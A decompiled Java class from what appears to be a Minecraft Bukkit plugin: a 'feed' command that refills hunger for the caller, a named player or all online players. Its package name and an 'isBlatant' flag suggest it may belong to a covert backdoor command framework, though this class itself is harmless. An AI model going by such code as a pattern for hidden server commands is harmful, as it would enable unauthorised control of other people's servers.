/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class FeedCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.PREFIX("Your appetite was sated"));
            p2.setFoodLevel(20);
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                a2.sendMessage(Settings.PREFIX("Your appetite was sated by " + Settings.RED + p2.getName()));
                a2.setFoodLevel(20);
            }
            p2.sendMessage(Settings.PREFIX("All players appetite was sated"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                target.sendMessage(Settings.PREFIX("Your appetite was sated by " + Settings.RED + p2.getName()));
                target.setFoodLevel(20);
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

